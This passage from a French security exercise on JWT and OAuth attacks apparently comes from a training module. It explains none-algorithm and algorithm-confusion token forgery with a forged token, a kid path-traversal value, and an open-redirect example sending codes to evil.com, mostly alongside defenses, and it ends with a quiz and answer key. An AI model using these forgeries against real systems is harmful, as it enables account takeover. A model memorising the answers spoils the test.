â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### OAuth 2.0 Redirect Attack

```
                        OAUTH OPEN REDIRECT ATTACK

     LÃ‰GITIME                           MALVEILLANT
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ redirect_uri=    â”‚              â”‚ redirect_uri=                â”‚
â”‚ https://app.com/ â”‚              â”‚ https://app.com.evil.com/    â”‚
â”‚ callback         â”‚              â”‚ callback                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚                                      â”‚
         â”‚                                      â”‚
         â–¼                                      â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Authorization    â”‚              â”‚ Authorization Server         â”‚
â”‚ Server           â”‚              â”‚ (prefix_match validation)    â”‚
â”‚                  â”‚              â”‚                              â”‚
â”‚ âœ… Match exact   â”‚              â”‚ âœ… "app.com" prÃ©fixe OK      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚                                      â”‚
         â”‚ code=abc123                          â”‚ code=abc123
         â–¼                                      â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ https://app.com/ â”‚              â”‚ https://app.com.evil.com/    â”‚
â”‚ callback?code=   â”‚              â”‚ callback?code=               â”‚
â”‚                  â”‚              â”‚                              â”‚
â”‚ âœ… App lÃ©gitime  â”‚              â”‚ âŒ ATTAQUANT RÃ‰CUPÃˆRE LE CODEâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

### 5.4 Les piÃ¨ges en dÃ©tail

#### PiÃ¨ge 1 : Case-sensitivity du "none" algorithm

```rust
// âŒ PIÃˆGE : Ne teste que "none" exact
if alg == "none" { /* vulnÃ©rable */ }

// âœ… CORRECT : Test case-insensitive
if alg.to_lowercase() == "none" { /* vulnÃ©rable */ }
// Ou mieux : regex pour toutes les variations
```

**Pourquoi c'est un piÃ¨ge :** Les serveurs ont des comportements diffÃ©rents. Certains normalisent, d'autres non.

#### PiÃ¨ge 2 : Confusion entre Base64 et Base64URL

```rust
// âŒ PIÃˆGE : Utiliser Base64 standard
let decoded = base64::decode(header)?;  // Ã‰choue sur - et _

// âœ… CORRECT : Base64URL avec remplacement
let header = header.replace('-', "+").replace('_', "/");
// Puis ajouter le padding si nÃ©cessaire
```

**Pourquoi c'est un piÃ¨ge :** JWT utilise Base64URL (RFC 4648 Section 5), pas Base64 standard.

#### PiÃ¨ge 3 : Signature vide avec "none" algorithm

```rust
// JWT avec alg:none peut avoir 2 ou 3 parties
"header.payload"     // 2 parties, signature absente
"header.payload."    // 3 parties, signature vide

// Les deux sont valides pour alg:none !
```

#### PiÃ¨ge 4 : OAuth state vs PKCE

```rust
// âŒ CONFUSION COURANTE :
// - state protÃ¨ge contre CSRF (attaquant force victime Ã  autoriser)
// - PKCE protÃ¨ge contre interception du code (attaquant vole le code)

// Ce sont DEUX problÃ¨mes diffÃ©rents !
```

---

### 5.5 Cours Complet

#### 5.5.1 JSON Web Tokens (JWT) - Structure

Un JWT est composÃ© de trois parties sÃ©parÃ©es par des points :

```
HEADER.PAYLOAD.SIGNATURE
```

**Header** contient :
- `alg` : Algorithme de signature (HS256, RS256, ES256, none...)
- `typ` : Type du token (gÃ©nÃ©ralement "JWT")
- `kid` : Key ID (optionnel, identifie la clÃ©)
- `jku` : JWK Set URL (optionnel, URL des clÃ©s)

**Payload** contient les claims :
- `sub` : Subject (identifiant utilisateur)
- `iss` : Issuer (Ã©metteur)
- `aud` : Audience (destinataire)
- `exp` : Expiration time
- `iat` : Issued at
- `nbf` : Not before
- Claims personnalisÃ©s (role, permissions...)

**Signature** :
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

#### 5.5.2 Algorithmes de signature

| Algorithme | Type | ClÃ© | SÃ©curitÃ© |
|------------|------|-----|----------|
| HS256 | SymÃ©trique | Secret partagÃ© | ModÃ©rÃ©e |
| RS256 | AsymÃ©trique | RSA pub/priv | Haute |
| ES256 | AsymÃ©trique | ECDSA | Haute |
| PS256 | AsymÃ©trique | RSA-PSS | TrÃ¨s haute |
| none | Aucun | Aucune | AUCUNE |

#### 5.5.3 Attaque None Algorithm

L'attaque exploite le fait que `alg: none` est techniquement valide selon la spec JWT. Si le serveur ne vÃ©rifie pas explicitement l'algorithme :

```python
# Token original
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIn0.signature

# Token forgÃ©
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
                 â†‘                              â†‘           â†‘
            alg:none                       role:admin   pas de sig
```

**Protection :** Rejeter explicitement `alg: none` :
```rust
if alg.to_lowercase() == "none" {
    return Err("Algorithm 'none' not allowed");
}
```

#### 5.5.4 Attaque Algorithm Confusion

L'attaque exploite la diffÃ©rence entre HMAC (symÃ©trique) et RSA (asymÃ©trique) :

1. Token RS256 original signÃ© avec **clÃ© privÃ©e RSA**
2. VÃ©rification avec **clÃ© publique RSA**
3. Attaquant change `alg` en HS256
4. Signe avec la **clÃ© publique comme secret HMAC**
5. Serveur utilise `alg` du token â†’ vÃ©rifie avec la clÃ© publique â†’ **VALIDE**

**Protection :** Ne jamais faire confiance Ã  l'`alg` du token :
```rust
// Configuration serveur
let expected_algorithm = Algorithm::RS256;  // FixÃ© cÃ´tÃ© serveur
verify(token, expected_algorithm, key)?;  // Ignore l'alg du token
```

#### 5.5.5 OAuth 2.0 - Flows et vulnÃ©rabilitÃ©s

**Authorization Code Flow (recommandÃ©)** :
```
User â†’ Auth Server â†’ User (code) â†’ App â†’ Auth Server (code â†’ token)
```
VulnÃ©rabilitÃ©s : Open redirect, Code interception sans PKCE

**Implicit Flow (dÃ©prÃ©ciÃ©)** :
```
User â†’ Auth Server â†’ User (token dans URL fragment)
```
VulnÃ©rabilitÃ©s : Token dans Referer, historique navigateur, logs

**Client Credentials Flow** :
```
App â†’ Auth Server (client_id + secret) â†’ token
```
VulnÃ©rabilitÃ©s : Secret exposÃ© dans code client

#### 5.5.6 PKCE (Proof Key for Code Exchange)

Protection contre l'interception du code d'autorisation :

```
1. Client gÃ©nÃ¨re: code_verifier (alÃ©atoire)
2. Client calcule: code_challenge = SHA256(code_verifier)
3. Authorization request inclut: code_challenge
4. Token request inclut: code_verifier
5. Server vÃ©rifie: SHA256(code_verifier) == code_challenge
```

Sans PKCE, un attaquant qui intercepte le `code` peut l'Ã©changer. Avec PKCE, il lui faut aussi le `code_verifier` qui n'a jamais transitÃ©.

---

### 5.6 Normes avec explications pÃ©dagogiques

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ âŒ HORS NORME (vulnÃ©rable)                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ let alg = token.header.alg;  // Fait confiance au token         â”‚
â”‚ verify(token, alg, key)?;                                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ âœ… CONFORME (sÃ©curisÃ©)                                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ let expected_alg = config.jwt_algorithm;  // CÃ´tÃ© serveur       â”‚
â”‚ if token.header.alg != expected_alg {                           â”‚
â”‚     return Err("Algorithm mismatch");                           â”‚
â”‚ }                                                               â”‚
â”‚ verify(token, expected_alg, key)?;                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ğŸ“– POURQUOI ?                                                   â”‚
â”‚                                                                 â”‚
â”‚ â€¢ Le token est contrÃ´lÃ© par l'attaquant                         â”‚
â”‚ â€¢ Ne jamais faire confiance aux donnÃ©es du token pour la        â”‚
â”‚   vÃ©rification elle-mÃªme                                        â”‚
â”‚ â€¢ L'algorithme doit Ãªtre une configuration serveur fixe         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

### 5.7 Simulation avec trace d'exÃ©cution

**EntrÃ©e :** JWT RS256 avec clÃ© publique disponible

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Ã‰tape â”‚ Action                                              â”‚ RÃ©sultat                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   1   â”‚ DÃ©couper token: "eyJ...".split('.')                 â”‚ [header, payload, sig]     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   2   â”‚ DÃ©coder header Base64URL                            â”‚ {"alg":"RS256","typ":"JWT"}â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   3   â”‚ VÃ©rifier none algorithm: "RS256".lower() == "none"  â”‚ false â†’ pas vulnÃ©rable     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   4   â”‚ VÃ©rifier algorithm confusion: "RS256".startsWith("RS")â”‚ true â†’ potentiellement vulnâ”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   5   â”‚ ClÃ© publique disponible ?                           â”‚ true â†’ attaque possible    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   6   â”‚ GÃ©nÃ©rer nouveau header: {"alg":"HS256"}             â”‚ eyJhbGciOiJIUzI1NiJ9       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   7   â”‚ Construire signing_input: header_b64.payload_b64    â”‚ eyJ...eyJ...               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   8   â”‚ Signer avec clÃ© publique: HMAC(pubkey, input)       â”‚ nouvelle signature         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   9   â”‚ Construire token forgÃ©                              â”‚ eyJhbGciOiJIUzI1NiJ9.eyJ..â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  10   â”‚ Retourner vulnÃ©rabilitÃ© ALGORITHM_CONFUSION         â”‚ { type, forged_token, ... }â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

### 5.8 MnÃ©motechniques

#### ğŸ¬ MEME : "Catch Me If You Can" â€” JWT Forgery

![Frank Abagnale](catch_me_if_you_can.jpg)

Comme Frank Abagnale qui forgeait des chÃ¨ques Pan Am avec les bons numÃ©ros de routage mais signÃ©s par lui-mÃªme, tu forges des JWT avec les bons claims mais une signature que TU contrÃ´les.

```rust
// Frank change le nom sur le chÃ¨que
let payload = json!({"role": "admin"});

// Et il signe avec SA signature (la clÃ© publique comme secret)
let forged = sign_with_public_key(header, payload, pubkey);

// La banque (le serveur) vÃ©rifie... et Ã§a passe !
// "Paper hangs better than a bad painting"
```

---

#### ğŸ” MEME : "One does not simply trust the alg header"

```
                    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
                    â•‘                                        â•‘
                    â•‘   ONE DOES NOT SIMPLY                  â•‘
                    â•‘                                        â•‘
                    â•‘   TRUST THE ALG HEADER                 â•‘
                    â•‘         FROM A JWT                     â•‘
                    â•‘                                        â•‘
                    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

Le header `alg` vient du **token lui-mÃªme** â€” c'est-Ã -dire de l'**attaquant**. Faire confiance Ã  cette valeur pour choisir l'algorithme de vÃ©rification, c'est demander Ã  un faussaire quelle technique utiliser pour vÃ©rifier son faux.

---

#### ğŸ­ MEME : "This is fine" â€” OAuth Implicit Flow

```
                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚                                      â”‚
                    â”‚   ğŸ”¥                           ğŸ”¥    â”‚
                    â”‚        ğŸ•                            â”‚
                    â”‚     "This is fine"                   â”‚
                    â”‚                                      â”‚
                    â”‚   Token dans l'URL fragment          â”‚
                    â”‚   Referer header fuite               â”‚
                    â”‚   Historique navigateur exposÃ©       â”‚
                    â”‚   DevTools affiche tout              â”‚
                    â”‚   ğŸ”¥                         ğŸ”¥     â”‚
                    â”‚                                      â”‚
                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

L'Implicit Flow est comme ce meme : tout brÃ»le autour, mais les dÃ©veloppeurs disent "This is fine" parce que c'est plus simple Ã  implÃ©menter.

**Solution :** Utilisez le Authorization Code Flow avec PKCE.

---

### 5.9 Applications pratiques

| ScÃ©nario | Application de l'exercice |
|----------|---------------------------|
| **Audit d'application** | Scanner tous les endpoints qui acceptent des JWT |
| **Bug Bounty** | Tester systÃ©matiquement none, confusion, kid |
| **DÃ©veloppement sÃ©curisÃ©** | Configurer correctement les librairies JWT |
| **Incident Response** | Identifier si des tokens ont Ã©tÃ© forgÃ©s |
| **Architecture** | Choisir entre JWT stateless et sessions |

---

## âš ï¸ SECTION 6 : PIÃˆGES â€” RÃ‰CAPITULATIF

| # | PiÃ¨ge | Erreur commune | Solution |
|---|-------|----------------|----------|
| 1 | None case-insensitive | Tester seulement "none" | `alg.to_lowercase() == "none"` |
| 2 | Base64 vs Base64URL | Utiliser Base64 standard | Remplacer `-` par `+`, `_` par `/` |
| 3 | Algorithm confusion | Faire confiance Ã  `alg` du token | Fixer l'algo cÃ´tÃ© serveur |
| 4 | Kid injection | Pas de validation du kid | Whitelist ou sanitize |
| 5 | OAuth state vs PKCE | Confondre les protections | State=CSRF, PKCE=interception |
| 6 | Implicit flow | L'utiliser en production | Authorization Code + PKCE |
| 7 | Token forgÃ© incomplet | DÃ©tection sans preuve | Toujours gÃ©nÃ©rer le token |

---

## ğŸ“ SECTION 7 : QCM

### Question 1
**Qu'est-ce que l'attaque "Algorithm Confusion" sur JWT ?**

- A) Changer le payload sans modifier la signature
- B) Utiliser la clÃ© publique RSA comme secret HMAC aprÃ¨s avoir changÃ© l'algo en HS256
- C) Deviner le secret HMAC par brute-force
- D) Supprimer complÃ¨tement la signature
- E) Modifier l'expiration du token
- F) Utiliser un algorithme dÃ©prÃ©ciÃ© comme MD5
- G) Inverser l'ordre header/payload
- H) Utiliser plusieurs algorithmes simultanÃ©ment
- I) Chiffrer le token au lieu de le signer
- J) Aucune de ces rÃ©ponses

**RÃ©ponse : B**

---

### Question 2
**Quel header JWT permet potentiellement une attaque par path traversal ?**

- A) alg
- B) typ
- C) kid
- D) iss
- E) sub
- F) exp
- G) iat
- H) aud
- I) nbf
- J) jti

**RÃ©ponse : C** (kid = Key ID, peut pointer vers un fichier)

---

### Question 3
**Quelle validation OAuth `redirect_uri` est la plus sÃ©curisÃ©e ?**

- A) none (pas de validation)
- B) prefix_match (prÃ©fixe seulement)
- C) domain_only (domaine seulement)
- D) strict (correspondance exacte)
- E) regex (expression rÃ©guliÃ¨re)
- F) contains (contient l'URL)
- G) suffix_match (suffixe seulement)
- H) case_insensitive (ignore la casse)
- I) path_only (chemin seulement)
- J) subdomain_allowed (sous-domaines autorisÃ©s)

**RÃ©ponse : D** (strict = correspondance exacte, seule vraiment sÃ©curisÃ©e)

---

### Question 4
**Pourquoi l'Implicit Flow OAuth est-il dÃ©prÃ©ciÃ© ?**

- A) Il est trop complexe Ã  implÃ©menter
- B) Il expose le token dans l'URL fragment, accessible via Referer et historique
- C) Il ne supporte pas les refresh tokens
- D) Il nÃ©cessite JavaScript
- E) Il est incompatible avec mobile
- F) Il ne fonctionne qu'avec HTTPS
- G) Il requiert des cookies
- H) Il est lent
- I) Il ne supporte pas PKCE
- J) Il nÃ©cessite une backend

**RÃ©ponse : B**

---

### Question 5
**Quelle attaque le paramÃ¨tre `state` OAuth protÃ¨ge-t-il ?**

- A) XSS
- B) SQL Injection
- C) CSRF (Cross-Site Request Forgery)
- D) Open Redirect
- E) Token Leakage
- F) Man-in-the-Middle
- G) Replay Attack
- H) Session Fixation
- I) Clickjacking
- J) SSRF

**RÃ©ponse : C**

---

### Question 6
**Quel CWE correspond Ã  l'utilisation d'un algorithme cryptographique insuffisant ?**

- A) CWE-79
- B) CWE-89
- C) CWE-327
- D) CWE-352
- E) CWE-601
- F) CWE-22
- G) CWE-918
- H) CWE-287
- I) CWE-502
- J) CWE-434

**RÃ©ponse : C** (CWE-327 : Use of a Broken or Risky Cryptographic Algorithm)

---

### Question 7
**Dans JWT, que contient le header `jku` ?**

- A) La clÃ© privÃ©e
- B) L'identifiant de la clÃ©
- C) L'URL du JWK Set contenant les clÃ©s publiques
- D) Le secret HMAC encodÃ©
- E) L'algorithme de chiffrement
- F) Le type de token
- G) L'Ã©metteur du token
- H) La date d'expiration
- I) L'audience cible
- J) Le nonce

**RÃ©ponse : C** (jku = JWK Set URL)

---

### Question 8
**Quelle est la bonne pratique pour vÃ©rifier l'algorithme d'un JWT ?**

- A) Utiliser l'algorithme spÃ©cifiÃ© dans le header du token
- B) Accepter tous les algorithmes supportÃ©s par la librairie
- C) DÃ©finir l'algorithme attendu cÃ´tÃ© serveur et rejeter si diffÃ©rent
- D) VÃ©rifier seulement si l'algorithme est dans une liste noire
- E) Laisser le client choisir l'algorithme
- F) Utiliser le plus rÃ©cent algorithme disponible
- G) Faire confiance au header si le token n'est pas expirÃ©
- H) VÃ©rifier l'algorithme aprÃ¨s la signature
- I) Ignorer l'algorithme et utiliser une valeur par dÃ©faut
- J) Accepter l'algorithme si la signature est valide

**RÃ©ponse : C**

---

### Question 9
**Quelle attaque exploite un JWT avec `kid: "../../dev/null"` ?**

- A) SQL Injection
- B) XSS
- C) Path Traversal / Local File Inclusion
- D) SSRF
- E) XXE
- F) Command Injection
- G) Deserialization
- H) Open Redirect
- I) CORS bypass
- J) HTTP Smuggling

**RÃ©ponse : C** (kid peut pointer vers un fichier local)

---

### Question 10
**Quel mÃ©canisme protÃ¨ge contre l'interception du code d'autorisation OAuth ?**

- A) state parameter
- B) nonce parameter
- C) PKCE (Proof Key for Code Exchange)
- D) client_secret
- E) redirect_uri validation
- F) token_type
- G) scope limitation
- H) audience restriction
- I) acr claim
- J) amr claim

**RÃ©ponse : C** (PKCE protÃ¨ge le code, state protÃ¨ge contre CSRF)

---

## ğŸ“Š SECTION 8 : RÃ‰CAPITULATIF

| MÃ©trique | Valeur |
|----------|--------|
| **DifficultÃ©** | â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†â˜† (8/10) |
| **Temps estimÃ©** | 240 minutes |
| **XP Base** | 350 |
| **XP Bonus** | Ã—3 (1050 total) |
| **Concepts clÃ©s** | JWT structure, None algorithm, Algorithm confusion, OAuth 2.0, PKCE |
| **CWE couverts** | CWE-327, CWE-22, CWE-352, CWE-601, CWE-287, CWE-598 |
| **Mutants** | 6 (Boundary, Safety, Resource, Logic, Return, Edge Case) |
| **Tests** | 12 cas + fuzzing 500 itÃ©rations |

---

## ğŸ“¦ SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.3.6-c-jwt-attack-suite",
    "generated_at": "2025-01-11T12:00:00Z",

    "metadata": {
      "exercise_id": "3.3.6-c",
      "exercise_name": "jwt_attack_suite",
      "module": "3.3.6",
      "module_name": "Authentification & Session Security",
      "concept": "c",
      "concept_name": "JWT Attack Suite",
      "type": "pratique",
      "tier": 2,
      "tier_info": "MÃ©lange (JWT + OAuth 2.0 + OpenID Connect)",
      "phase": 3,
      "difficulty": 8,
